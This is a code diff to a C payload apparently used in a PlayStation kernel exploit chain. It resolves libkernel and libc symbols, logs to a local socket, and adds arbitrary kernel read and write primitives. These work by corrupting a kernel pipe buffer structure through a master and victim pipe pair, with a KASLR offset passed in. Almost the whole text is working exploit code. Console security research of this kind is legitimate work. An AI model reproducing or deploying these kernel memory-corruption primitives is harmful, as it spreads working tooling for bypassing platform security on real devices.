@@ -7,15 +7,17 @@
 #include <string.h>
 #include <sys/socket.h>
 
-#define LOG_IP "192.168.254.120"
+#define LOG_IP "192.168.1.53"
 #define LOG_PORT 1337
 
 #define LIBC_MODULE_HANDLE 0x2
 #define LIBKERNEL_MODULE_HANDLE 0x2001
 
+#define PAGE_SIZE 0x4000
+
 typedef int32_t SceKernelModule;
 
-int (*sceKernelDlsym)(SceKernelModule handle, const char *symbol, void **addrp);
+void *(*dlsym)(SceKernelModule handle, const char *symbol);
 
 // libkernel functions
 
@@ -162,8 +164,7 @@ int vsnprintf(char *restrict str, size_t size, const char *restrict format,
 }
 
 void resolve_imports(void) {
-#define LIBKERNEL_RESOLVE(name)                                                \
-  sceKernelDlsym(LIBKERNEL_MODULE_HANDLE, #name, (void **)&_##name)
+#define LIBKERNEL_RESOLVE(name) _##name = dlsym(LIBKERNEL_MODULE_HANDLE, #name)
   LIBKERNEL_RESOLVE(__error);
   LIBKERNEL_RESOLVE(accept);
   LIBKERNEL_RESOLVE(bind);
@@ -177,18 +178,17 @@ void resolve_imports(void) {
   LIBKERNEL_RESOLVE(write);
 #undef LIBKERNEL_RESOLVE
 
-#define LIBC_RESOLVE(name)                                                     \
-  sceKernelDlsym(LIBC_MODULE_HANDLE, #name, (void **)&_##name)
+#define LIBC_RESOLVE(name) _##name = dlsym(LIBC_MODULE_HANDLE, #name)
   LIBC_RESOLVE(calloc);
   LIBC_RESOLVE(fclose);
   LIBC_RESOLVE(fopen);
   LIBC_RESOLVE(fread);
   // LIBC_RESOLVE(free);
-  sceKernelDlsym(LIBC_MODULE_HANDLE, "free", (void **)&free);
+  free = dlsym(LIBC_MODULE_HANDLE, "free");
   LIBC_RESOLVE(fseek);
   LIBC_RESOLVE(ftell);
   // LIBC_RESOLVE(malloc);
-  sceKernelDlsym(LIBC_MODULE_HANDLE, "malloc", (void **)&malloc);
+  malloc = dlsym(LIBC_MODULE_HANDLE, "malloc");
   LIBC_RESOLVE(memcpy);
   LIBC_RESOLVE(memset);
   LIBC_RESOLVE(realloc);
@@ -220,6 +220,7 @@ int printf(const char *__restrict fmt, ...) {
 
 int puts(const char *str) {
   write(log_sock, str, strlen(str));
+  write(log_sock, "\n", 1);
   return 0;
 }
 
@@ -249,10 +250,82 @@ int init_log(void) {
 
 void shutdown_log(void) { close(log_sock); }
 
-int payload(void *dlsym) {
+typedef struct {
+  void *dlsym;
+  uint64_t kaslr_offset;
+  int *master_pipe_fd;
+  int *victim_pipe_fd;
+} PayloadArgs;
+
+PayloadArgs *payload_args;
+
+struct pipebuf {
+  uint32_t cnt;
+  uint32_t in;
+  uint32_t out;
+  uint32_t size;
+  uintptr_t buffer;
+};
+
+int corrupt_pipebuf(uint32_t cnt, uint32_t in, uint32_t out, uint32_t size,
+                    uintptr_t buffer) {
+  struct pipebuf buf = {};
+  buf.cnt = cnt;
+  buf.in = in;
+  buf.out = out;
+  buf.size = size;
+  buf.buffer = buffer;
+  write(payload_args->master_pipe_fd[1], &buf, sizeof(buf));
+  return read(payload_args->master_pipe_fd[0], &buf, sizeof(buf));
+}
+
+int kread(void *dest, uintptr_t src, size_t n) {
+  corrupt_pipebuf(n, 0, 0, PAGE_SIZE, src);
+  return read(payload_args->victim_pipe_fd[0], dest, n);
+}
+
+int kwrite(uintptr_t dest, const void *src, size_t n) {
+  corrupt_pipebuf(0, 0, 0, PAGE_SIZE, dest);
+  return write(payload_args->victim_pipe_fd[1], src, n);
+}
+
+uint8_t kread8(uintptr_t addr) {
+  uint8_t val = 0;
+  kread(&val, addr, sizeof(val));
+  return val;
+}
+
+uint16_t kread16(uintptr_t addr) {
+  uint16_t val = 0;
+  kread(&val, addr, sizeof(val));
+  return val;
+}
+
+uint32_t kread32(uintptr_t addr) {
+  uint32_t val = 0;
+  kread(&val, addr, sizeof(val));
+  return val;
+}
+
+uint64_t kread64(uintptr_t addr) {
+  uint64_t val = 0;
+  kread(&val, addr, sizeof(val));
+  return val;
+}
+
+void kwrite8(uintptr_t addr, uint8_t val) { kwrite(addr, &val, sizeof(val)); }
+
+void kwrite16(uintptr_t addr, uint16_t val) { kwrite(addr, &val, sizeof(val)); }
+
+void kwrite32(uintptr_t addr, uint32_t val) { kwrite(addr, &val, sizeof(val)); }
+
+void kwrite64(uintptr_t addr, uint64_t val) { kwrite(addr, &val, sizeof(val)); }
+
+int payload(PayloadArgs *args) {
   int ret;
 
-  sceKernelDlsym = dlsym;
+  payload_args = args;
+  dlsym = args->dlsym;
 
   resolve_imports();
 
@@ -260,7 +333,7 @@ int payload(void *dlsym) {
   if (ret < 0)
     return errno;
 
-  printf("payload entered\n");
+  printf("[+] Payload entered\n");
 
   shutdown_log();
 
